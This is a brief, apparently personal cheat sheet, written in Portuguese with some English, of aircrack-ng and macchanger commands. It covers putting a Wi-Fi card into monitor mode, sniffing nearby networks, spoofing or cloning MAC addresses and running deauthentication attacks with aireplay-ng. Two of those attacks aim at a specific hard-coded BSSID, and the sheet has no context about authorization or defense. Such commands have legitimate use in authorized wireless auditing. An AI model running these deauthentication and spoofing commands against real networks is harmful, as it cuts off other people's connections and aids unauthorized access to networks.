# aircrack-ng Linha de Comando:

### Checando dispositivos de rede:
>  ifconfig

### Ativando a interface de monitoramento:
> airmon-ng start wlan0

### Desativando a interface de monitoramento:
> airmon-ng stop wlan0mon

### Fazendo monitoramento do ar:
> airodump-ng wlan0mon

### Fazendo monitoramento com restrição de canal e BSSID
> airodump-ng wlan0mon -c <canal> --bssid <bssid da rede>

### Desativando dispositivo de rede:
> ifconfig wlan0 down

### Usando o MacChanger:
> macchanger --help

### MAC randômico:
> macchanger -r wlan0

### Epeceficicar MAC:
> macchanger -m <MAC> wlan0

### Ver MAC atual e clonado:
> macchanger -s wlan0

### Recuperar MAC original:
> macchanger -p wlan0

### Filtrando monitoramento
> airodump-ng wlan0mon -c <canal> --bssid <bssid da rede>

### Ataque de desautenticação
> aireplay-ng -0 10 -a <bssid> wlan0mon

### How do I run NetworkManager on Kali Linux?
> service NetworkManager start or systemctl start NetworkManager 

### Starting monitor mode in determined channel (Ex: channel 5):

> airmon-ng start wlan0mon 5
> airmon-ng stop wlan1mon
> airmon-ng start wlan1mon 6

### monitorar bssid especifico
> airodump-ng wlan1mon --bssid AC:75:1D:7F:96:64 

### atacar
> aireplay-ng -0 10 -a AC:75:1D:7F:96:64 wlan1mon